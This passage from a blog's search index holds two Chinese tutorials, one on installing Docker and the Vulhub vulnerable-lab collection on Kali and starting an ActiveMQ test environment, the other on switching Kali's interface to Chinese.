        <content type="html"><![CDATA[<h2 id="vulhub靶场介绍"><a href="#vulhub靶场介绍" class="headerlink" title="vulhub靶场介绍"></a>vulhub靶场介绍</h2><p>vulhub官网:<a href="https://vulhub.org/">https://vulhub.org/</a></p><p>Vulhub是一个基于docker和docker-compose的漏洞环境集合，进入对应目录并执行一条语句即可启动一个全新的漏洞环境，让漏洞复现变得更加简单，让安全研究者更加专注于漏洞原理本身。</p><h2 id="搭建过程"><a href="#搭建过程" class="headerlink" title="搭建过程"></a>搭建过程</h2><h3 id="一、更新APT："><a href="#一、更新APT：" class="headerlink" title="一、更新APT："></a>一、更新APT：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get update </span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/02/iwsoul.png" alt="1"></p><h3 id="二、安装https协议，CA证书"><a href="#二、安装https协议，CA证书" class="headerlink" title="二、安装https协议，CA证书"></a>二、安装https协议，CA证书</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install -y apt-transport-https ca-certificates</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/02/ixdunx.png" alt="2"></p><h3 id="三、安装docker"><a href="#三、安装docker" class="headerlink" title="三、安装docker"></a>三、安装docker</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install docker.io</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/02/ixrhy3.png" alt="3"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> 查看版本        docker -v</span><br><span class="line">开启docker       systemctl start docker </span><br><span class="line">查看开启的环境    docker ps -a</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/02/ixvsqa.png" alt="4"></p><h3 id="四、安装PIP3"><a href="#四、安装PIP3" class="headerlink" title="四、安装PIP3"></a>四、安装PIP3</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install python3-pip</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/02/ixzjz6.png" alt="5"></p><h3 id="五、安装docker-compose"><a href="#五、安装docker-compose" class="headerlink" title="五、安装docker-compose"></a>五、安装docker-compose</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install docker-compose</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/02/iybn4s.png" alt="6"></p><h3 id="六、下载vulhub"><a href="#六、下载vulhub" class="headerlink" title="六、下载vulhub"></a>六、下载vulhub</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://gitee.com/puier/vulhub.git</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/02/iyfpzq.png" alt="7"></p><h3 id="七、验证靶场搭建成功"><a href="#七、验证靶场搭建成功" class="headerlink" title="七、验证靶场搭建成功"></a>七、验证靶场搭建成功</h3><p>这里以activemq中的CVE-2015-5654漏洞为例<br>首先进入到CVE-2015-5654文件中去。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd vulhub/activemq/CVE-2015-5654</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/02/iyj87n.png" alt="8"></p><p>接着：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对靶场进行编译：docker-compose build</span><br><span class="line">运行靶场：docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/02/iymfjt.png" alt="9"></p><p>查看开放的端口：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose ps</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/02/iyy2lj.png" alt="10"><br>发现其开放的端口为61616</p><p>在浏览器中访问:[IP]:61616，其中IP为你kali的ip地址<br><img src="https://pic.888888.al/i/2023/03/02/iz2jcy.png" alt="11"><br><strong>访问成功，即代表vulhub搭建成功</strong></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>之前想用centos搭建靶场，用物理机访问，但怎么也访问不了，在网上试了很多办法都没有成功，无奈选择kali。搭建过程也没有什么技巧，跟着步骤敲命令即可，如果下载失败，更改下载源就好了，网上也有教程，这里就不做赘述了。</p>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali汉化教程</title>
      <link href="/archives/4a17b156.html"/>
      <url>/archives/4a17b156.html</url>
      
        <content type="html"><![CDATA[<p>小伙伴有没有因为用不惯全英文kali而烦恼呢，这里教大家如何汉化kali。</p><h2 id="汉化教程"><a href="#汉化教程" class="headerlink" title="汉化教程"></a>汉化教程</h2><p>首先，此命令必须在root命令下进行，所以请先提权</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure><p>再输入以下命令:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dpkg-reconfigure locales</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/02/j10yvc.png" alt="1"><br><img src="https://pic.888888.al/i/2023/03/02/j1dyqg.png" alt="2"></p><p>进入到此页面:<br><img src="https://pic.888888.al/i/2023/03/02/j1gqmg.png" alt="3"></p><p>选中其中的<strong>en_US.UTF-8 UTF-8 和 zh_CN.UTF-8 UTF-8</strong>（空格键为确定键，TAB键为返回）</p><p>设置完成后，重启：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure><p>最后：<br><img src="https://pic.888888.al/i/2023/03/02/j1k91r.png" alt="4"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>希望对大家有所帮助哦</strong></p>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
